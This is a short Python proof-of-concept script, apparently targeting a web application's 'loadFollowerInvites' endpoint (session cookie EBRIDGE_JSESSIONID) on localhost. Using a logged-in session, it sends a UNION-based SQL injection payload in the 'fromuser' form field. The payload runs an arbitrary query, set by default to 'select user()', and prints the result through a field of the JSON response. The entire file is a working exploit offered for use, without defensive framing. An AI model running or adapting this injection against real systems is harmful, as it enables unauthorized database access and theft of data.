import requests

url = 'http://localhost:9999'
EBRIDGE_JSESSIONID = '479BF1EC9A78BCF4E916D35CE643D417'
sql = 'select user()'

cookies = {
    'EBRIDGE_JSESSIONID': EBRIDGE_JSESSIONID,
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    # 'Cookie': 'EBRIDGE_JSESSIONID=479BF1EC9A78BCF4E916D35CE643D417',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.76',
    'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

data={
    'fromuser': f"%' union select ({sql}), 123, 123 from information_schema.tables where table_schema!='"
}

response = requests.post(f'{url}/main/mp/follower/invite/loadFollowerInvites', cookies=cookies, headers=headers, data=data)
print(response.json()[0]['createdate'])